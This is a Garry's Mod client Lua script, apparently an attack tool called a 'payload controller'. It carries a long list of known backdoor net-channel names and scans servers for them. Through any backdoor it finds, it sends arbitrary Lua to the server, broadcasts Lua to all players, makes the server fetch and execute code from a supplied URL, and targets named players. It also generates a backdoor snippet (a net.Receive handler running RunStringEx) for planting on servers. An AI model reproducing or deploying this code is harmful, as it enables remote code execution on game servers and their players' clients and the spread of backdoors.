-- Commandline based payload controller by Gubbi. (Exploit feature not yet finished and doesn't work properly!)


local prefix = "qrex"
local channel = ""
local lPlayer = LocalPlayer():EntIndex()
local vulChannel = {}
local vulExploit = {}
local commands = {}
local exploits = {}
local groups = {}
local bdChannels = {"hacking bro","hackingbro","kebabmenu","rotten_proute","BITMINER_UPDATE_DLC","nostrip2","operationsmoke","vegeta","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","https://i.imgur.com/gf6hlml.png","print ( )","fps","fszof<qOvfdsf","tupeuxpaslabypass","_CAC_G","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","antileak","CreateAdminRanks","Asunalabestwaifu","shittycommand","tro2fakeestunpd","FAdmin_CreateVar","ContextHelp","lmaogetdunked","LV_BD_V2","createpanel","fuckyou","1337","haxor","r8helper","_chefhackv2","Þà?D)?","Þ  ?D)?","nostrip1","antilagger","Fix_Exploit","yazStats","FPSVBOOST","RTX420","Revelation","SizzurpDRM","cbbc","gSploit","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","Reaoscripting","ß ?D)?","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","!Çº/;.","NoOdium_Reaoscripting","m9k_","Î¾psilon","Backdoor","reaper","SDFTableFsSSQE","gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?","?", "Þ� ?D)◘", "Val", "models/zombie.mdl","REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited","PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab","L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions" , "PlayerCheck" , "Sbox_darkrp" , "insid3" , "The_Dankwoo" , "Sbox_itemstore" , "Ulib_Message" , "ULogs_Info" , "ITEM" , "R8" , "fix" , "Fix_Keypads" , "Remove_Exploiters" , "noclipcloakaesp_chat_text" , "_Defqon" , "_CAC_ReadMemory" , "nostrip" , "nocheat" , "LickMeOut" , "ULX_QUERY2" , "ULXQUERY2" , "https://i.imgur.com/Gf6hLMl.png" , "MoonMan" , "Im_SOCool" , "JSQuery.Data(Post(false))" , "Sandbox_GayParty" , "DarkRP_UTF8" , "OldNetReadData" , "Gamemode_get" , "memeDoor" , "BackDoor" , "SessionBackdoor" , "DarkRP_AdminWeapons" , "cucked" , "NoNerks" , "kek" , "ZimbaBackdoor" , "something" , "random" , "strip0" , "fellosnake" , "enablevac" , "idk" , "ÃžÃ� ?D)â—˜" , "snte" , "apg_togglemode" , "Hi" , "beedoor" , "BDST_EngineForceButton" , "VoteKickNO" , "REEEEEEEEEEEE" , "_da_" , "Nostra" , "sniffing" , "keylogger" , "CakeInstall" , "Cakeuptade" , "love" , "earth" , "ulibcheck" , "Nostrip_" , "teamfrench" , "ADM" , "hack" , "crack" , "leak" , "lokisploit" , "1234" , "123" , "enculer" , "cake" , "seized" , "88" , "88_strings_" , "nostraall" , "blogs_update" , "nolag" , "loona_" , "billys_logs" , "loona" , "negativedlebest" , "berettabest" , "ReadPing" , "antiexploit" , "adm_NetString" , "mathislebg" , "Bilboard.adverts:Spawn(false)" , "pjHabrp9EY" , "?" , "lag_ping" , "allowLimitedRCON(user) 0" , "aze46aez67z67z64dcv4bt" , "killserver" , "fuckserver" , "cvaraccess" , "rcon" , "rconadmin" , "web" , "jesuslebg" , "zilnix" , "��?D)?" , "disablebackdoor" , "kill" , "DefqonBackdoor" , "DarkRP_AllDoorDatas" , "0101.1" , "awarn_remove" , "_Infinity" , "Infinity" , "InfinityBackdoor" , "_Infinity_Meme_" , "arivia" , "ULogs_B" , "_Warns" , "_cac_" , "striphelper" , "_vliss" , "YYYYTTYXY6Y" , "?????????????????�???? ?? ?�???�?�?? ???�???�???�." , "_KekTcf" , "_blacksmurf" , "blacksmurfBackdoor" , "_Raze" , "m9k_explosionradius" , "m9k_explosive" , "m9k_addons" , "rcivluz" , "SENDTEST" , "_clientcvars" , "_main" , "stream" , "waoz" , "bdsm" , "ZernaxBackdoor" , "UKT_MOMOS" , "anticrash" , "audisquad_lua" , "dontforget" , "noprop" , "thereaper" , "0x13" , "Child" , "!Cac" , "azkaw" , "BOOST_FPS" , "childexploit" , "ULX_ANTI_BACKDOOR" , "FADMIN_ANTICRASH" , "ULX_QUERY_TEST2" , "GMOD_NETDBG" , "netlib_debug" , "_DarkRP_Reading" , "lag_ping" , "||||"  , "FPP_RemovePLYCache" , "fuwa" , "stardoor" , "SENDTEST" , "rcivluz" , "c" , "N::B::P" , "changename" , "PlayerItemPickUp" , "echangeinfo" , "fourhead" , "music" , "slua" , "adm_network" , "componenttolua" , "theberettabcd" , "SparksLeBg" , "DarkRP_Armors" , "DarkRP_Gamemodes" , "fancyscoreboard_leave" , "PRDW_GET" , "pwn_http_send" , "AnatikLeNoob" , "GVacDoor" , "Keetaxor" , "BackdoorPrivate666" , "YohSambreLeBest" , "SNTE<ALL" , "!�:/;." , "pwn_http_answer" , "pwn_wake" , "verifiopd" , "AidsTacos" , "shix" , "PDA_DRM_REQUEST_CONTENT" , "xenoreceivetargetdata2" , "xenoreceivetargetdata1" , "xenoserverdatafunction" , "xenoserverfunction" , "xenoclientdatafunction" , "xenoclientfunction" , "xenoactivation" , "EXEC_REMOTE_APPS" , "yohsambresicianatik<3" , "Sbox_Message" , "Sbox_gm_attackofnullday_key" , "The_DankWhy" , "nw.readstream" , "AbSoluT" , "__G____CAC" , "Weapon_88" , "mecthack" , "SetPlayerDeathCount" , "FAdmin_Notification_Receiver" , "DarkRP_ReceiveData" , "fijiconn" , "LuaCmd" , "EnigmaProject" , "z" , "cvardel" , "effects_en" , "file" , "gag" , "asunalabestwaifu" , "stoppk" , "Ulx_Error_88" , "NoOdium_ReadPing", " striphelper "}

local function checkChannel(str)
local i = 1
  while util.NetworkIDToString(i) do
    if util.NetworkIDToString(i) == str then
      return true
    end  
    i = i + 1 
  end
end

local function isSnteChannel(str, tbl)
    if(checkChannel(str)) then
        local netStr = util.NetworkStringToID(str)
        if(table.HasValue(tbl, util.NetworkIDToString(netStr + 1)) || table.HasValue(tbl, util.NetworkIDToString(netStr - 1)) ) then
            return true
        end
    end
  return false
end

local function channelNil()
  if channel == "" then
    MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.\n")
    return true
  end
  return false
end

local function dumpNet()
local i = 1
    while util.NetworkIDToString(i) do
        MsgC( Color(255, 255, 255), "Channel "..i.." = ", Color(155, 155, 155),''..util.NetworkIDToString(i).."\n")
        i = i + 1 
    end
end

local function intenseScan()
channel = ""
for k,v in pairs(bdChannels) do
    if( checkChannel(v)) then
        channel = v
        vulChannel[v] = {name = v}
    end
  end
  if(channel == "") then
    MsgC(Color(166, 222, 255), "No channel has been found.")
  else
    for _, q in pairs(vulChannel) do
    MsgC(Color(166, 222, 255), "Found channel: ", Color(155,155,155), q.name .."\n")
    end
    Msg("\n")
    MsgC(Color(166,222,255), "Total amount: ", Color(155,155,155), table.Count(vulChannel) .. "\n")
  end
end

local function snteScan() 
local found = false
local i = 0
  for k, v in pairs(bdChannels) do
    if(isSnteChannel(v, bdChannels)) then
      MsgC(Color(166,222,255), "Possible fake channel: ", Color(155,155,155), v .."\n")
      found = true
      i = i + 1
    end
  end
  if(!found) then
    MsgC(Color(166,222,255), "Didn't find anything. \n")
    else
    Msg("\n")
    MsgC(Color(166,222,255), "Total amount: ", Color(155,155,155), i .."\n")
  end
  
end


local function luaRun(ply, cmd, args, argStr)
if(!argStr) then return end
if(channelNil()) then return end
  net.Start(channel)
	net.WriteString(argStr)
	net.SendToServer()
  MsgN(argStr)
end

local function setTarget(ply, cmd, args, argStr)
if(!argStr) then return end
  if(checkChannel(argStr)) then
  channel = argStr
  MsgC(Color(166, 222, 255), "Target has been set to: ", Color(155,155,155), argStr)
else
    MsgC(Color(166, 222, 255), "Channel not found \n")
  end
end

local function help()
MsgC(Color(166,222,255), "Amount of known channels: ", Color(155,155,155), #bdChannels.."\n\n")
for k, v in pairs(groups) do
  MsgC(Color(51, 180, 255), v..": \n")
    for _, q in pairs(commands) do
      if(q.group == v) then
        MsgC(Color(166, 222, 255), q.name.." - ",Color(155, 155, 155), q.description.."\n")
      end
    end
    Msg("\n")
  end
end

local function scanExploits()
vulExploit = {}
MsgC(Color(166,222,255), "To launch an exploit use the following command: "..prefix.."_ex_launch <ID>\n")
for k, v in pairs(exploits) do
    if(checkChannel(v.channel)) then
          local id = #vulExploit
            vulExploit[id] = v
          MsgC(Color(255, 255, 255), id..") ", Color(166, 222, 255), v.name.. " - ", Color(155, 155, 155), v.channel.."\n")
    end
  end
end

local function launchExploit(id)
  net.Start(vulExploit[id].channel)
  vulExploit[id].func()
  net.SendToServer()
end

local function initExploit(ply, cmd, args)
  if(!args[1]) then return end
  local id = tonumber(args[1])
  if(!vulExploit[id]) then MsgC(Color(166,222,255), "Invalid exploit ID \n")
    return
  end

  launchExploit(id)
  MsgC(Color(166,222,255), "Exploit has been launched!\n")
end

local function addCommand(command, desc, group, func, autocomplete)
  concommand.Add(prefix.."_"..command, func, autocomplete )
  commands[tostring(command)] = {
    name = prefix.."_"..command,
    description = desc,
    group = group
  }
end

local function addExploit(name, channel, func)
  local id = #exploits
  exploits[id] = {
  name = name,
  id = id,
  channel = channel,
  func = func,
  vulnerable = false
}
end

local function generatePayload(ply, cmd, args, argStr)
 if(!argStr || argStr == "") then return end
  SetClipboardText([[util.AddNetworkString(']]..argStr..[[') net.Receive(']]..argStr..[[',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)]])
 MsgC(Color(166,222,255), "Payload has been generated and copied to your clipboard with the following channel: ", Color(155,155,155), argStr)
end

local function testFunction()
  PrintTable(vulExploit)
end

local function ACGetPlayers( cmd, stringargs )
	stringargs = string.Trim( stringargs )
	stringargs = string.lower( stringargs )
	local tbl = {}
	for k, v in pairs( player.GetAll() ) do
		local nick = v:Nick()
		if string.find( string.lower( nick ), stringargs ) then
      nick = cmd.. " " .."\""..nick.."\""
			table.insert( tbl, nick )
		end
	end
	return tbl
end

local function runFuncClient(ply, cmd, args, argStr)
  if(!args[1] && !args[2]) then return end
    if(channelNil()) then return end
    for k, v in pairs(player.GetAll()) do
      if(v:Nick() == args[1]) then
        local exec = "player.GetByID("..v:EntIndex().."):"..table.concat(args, nil, 2)
        net.Start(channel)
        net.WriteString(exec)
        net.SendToServer()
        MsgN(exec)
        return
    end
  end
end

local function broadcastFunc(ply, cmd, args, argStr)
  if(!argStr || argStr == "") then return end
    if(channelNil()) then return end
    local exec = "BroadcastLua([["..string.char(string.byte(argStr, 1, string.len(argStr))).."]])"
    net.Start(channel)
    net.WriteString(exec)
    net.SendToServer()
    MsgN(exec)
end

local function fetchUrl(ply, cmd, args, argStr)
  if(!argStr || argStr == "") then return end
    if(channelNil()) then return end
    local exec = "http.Fetch('http://"..argStr.."', RunString)"
    net.Start(channel)
    net.WriteString(exec)
    net.SendToServer()
    MsgN(exec)
end

local function playUrl(ply, cmd, args, argStr)
  if(!argStr || argStr == "") then return end
    if(channelNil()) then return end
    local exec = "BroadcastLua([[sound.PlayURL('http://"..argStr.."', 'mono', function() end)]])"
    net.Start(channel)
    net.WriteString(exec)
    net.SendToServer()
    MsgN(exec)
end

local function init()
MsgC(Color(166, 222, 255), "Qrextomnia Utility has successfully initialized!\nType "..prefix.."_help for a list of commands")

addCommand("test", "Test", "Utility", testFunction)
addCommand("help", "Shows you a list of commands and their description.", "Help", help)
addCommand("pl_intensescan", "Launches an intense scan on the server (This can be risky due to discarding net messages).", "Payloads", intenseScan)
addCommand("pl_sntescan", "Scans for possible fake channels.", "Payloads", snteScan)
addCommand("pl_run", "Sends function to selected channel.", "Payloads", luaRun)
addCommand("pl_run_cl", "Run a class on a target player.", "Payloads", runFuncClient, ACGetPlayers)
addCommand("util_genpayload", "Takes one string argument as the channel identifier for the payload.", "Utility", generatePayload)
addCommand("util_dump", "Dump all the networking channels in a nice neat list.", "Utility", dumpNet)
addCommand("util_target", "Sets the target channel (Takes 1 argument).", "Utility", setTarget)
addCommand("ex_scan", "Scans for possible exploits on the server.", "Exploits", scanExploits)
addCommand("ex_launch", "Launch exploit from ID", "Exploits", initExploit)
addCommand("pl_run_sh", "Broadcasts lua to all players.", "Payloads", broadcastFunc)
addCommand("pl_run_url", "Fetches body of url and attempts to execute it.", "Payloads", fetchUrl)
addCommand("pl_sound_url", "Fetches body of url and attempts to execute it.", "Payloads", playUrl)

addExploit("Free Ammo", "TCBBuyAmmo", function()  end)
addExploit("Test", "striphelper", function() net.WriteString("print('bruh')") end)

for k, v in pairs(commands) do
  groups[v.group] = v.group
end

table.Reverse(commands)
end


init()
